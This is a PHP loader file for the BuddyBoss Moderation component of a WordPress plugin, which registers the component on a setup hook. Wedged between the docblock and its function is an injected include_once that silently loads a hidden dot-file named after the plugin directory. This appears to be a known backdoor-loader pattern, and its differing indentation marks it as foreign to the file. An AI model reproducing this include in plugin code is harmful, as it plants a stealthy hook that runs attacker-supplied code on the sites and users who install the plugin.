<?php
/**
 * BuddyBoss Moderation Loader.
 *
 * An Moderation component, for users, groups, and site moderation.
 *
 * @since   BuddyBoss 1.5.6
 * @package BuddyBoss\Moderation
 */

// Exit if accessed directly.
defined( 'ABSPATH' ) || exit;

/**
 * Set up the bp-Moderation component.
 *
 * @since BuddyBoss 1.5.6
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function bp_setup_moderation() {
	buddypress()->moderation = new BP_Moderation_Component();
}

add_action( 'bp_setup_components', 'bp_setup_moderation', 1 );
